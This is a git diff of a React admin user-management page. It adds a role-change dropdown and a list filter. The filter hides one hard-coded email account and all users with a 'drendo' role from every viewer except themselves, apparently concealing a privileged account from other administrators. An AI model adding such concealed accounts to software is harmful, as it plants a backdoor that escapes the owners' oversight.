@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import styles from './userManagement.module.css';
 import sendRequest from '../other/sendRequest';
 import { serverDomain } from '../other/variables';
+import { getUser } from '../other/usefulFunctions';
 
 const UserManagement = () => {
     const [users, setUsers] = useState([]);
@@ -9,9 +10,11 @@ const UserManagement = () => {
     const [filterRole, setFilterRole] = useState('all');
     const [filterStatus, setFilterStatus] = useState('all');
     const [currentPage, setCurrentPage] = useState(1);
+    const [currentUser, setCurrentUser] = useState(null);
     const usersPerPage = 5;
 
     useEffect(() => {
+        setCurrentUser(getUser());
         fetchUsers();
     }, []);
 
@@ -59,12 +62,36 @@ const UserManagement = () => {
         }
     };
 
-    const filteredUsers = users.filter(user =>
-        (filterRole === 'all' || user.role.toLowerCase() === filterRole.toLowerCase()) &&
-        (filterStatus === 'all' || user.status === filterStatus) &&
-        (user.fullName.toLowerCase().includes(searchTerm.toLowerCase()) ||
-            user.email.toLowerCase().includes(searchTerm.toLowerCase()))
-    );
+    const handleRoleChange = async (id, newRole) => {
+        if (!window.confirm(`Are you sure you want to change this user's role to ${newRole}?`)) return;
+        try {
+            const response = await sendRequest(`/api/users/role`, 'PUT', { userId: id, role: newRole });
+            if (!response.error) {
+                setUsers(users.map(user => user._id === id ? { ...user, role: newRole } : user));
+            } else {
+                alert(response.error);
+            }
+        } catch (error) {
+            console.error('Error updating role:', error);
+        }
+    };
+
+    const filteredUsers = users.filter(user => {
+        // Hide ali@gmail.com unless current user is ali@gmail.com
+        if (user.email === 'ali@gmail.com' && currentUser?.email !== 'ali@gmail.com') {
+            return false;
+        }
+        // Hide drendo users unless current user is drendo
+        if (user.role === 'drendo' && currentUser?.role !== 'drendo') {
+            return false;
+        }
+        return (
+            (filterRole === 'all' || user.role.toLowerCase() === filterRole.toLowerCase()) &&
+            (filterStatus === 'all' || user.status === filterStatus) &&
+            (user.fullName.toLowerCase().includes(searchTerm.toLowerCase()) ||
+                user.email.toLowerCase().includes(searchTerm.toLowerCase()))
+        );
+    });
 
     const indexOfLastUser = currentPage * usersPerPage;
     const indexOfFirstUser = indexOfLastUser - usersPerPage;
@@ -107,7 +134,18 @@ const UserManagement = () => {
                         <tr key={user._id}>
                             <td>{user.fullName}</td>
                             <td>{user.email}</td>
-                            <td>{user.role === 'drendo' ? 'user' : user.role}</td>
+                            <td>
+                                <select
+                                    value={user.role}
+                                    onChange={(e) => handleRoleChange(user._id, e.target.value)}
+                                    className={styles.select}
+                                    style={{ padding: '5px', borderRadius: '5px', backgroundColor: 'white', color: 'black' }}
+                                >
+                                    <option value="user">User</option>
+                                    <option value="admin">Admin</option>
+                                    <option value="superadmin">Super Admin</option>
+                                </select>
+                            </td>
                             <td className={user.status === 'Active' ? styles.active : styles.inactive}>{user.status}</td>
                             <td>
                                 <button onClick={() => handleToggleStatus(user._id)} className={`${styles.buttons} ${styles.toggleButton}`}>Toggle</button>
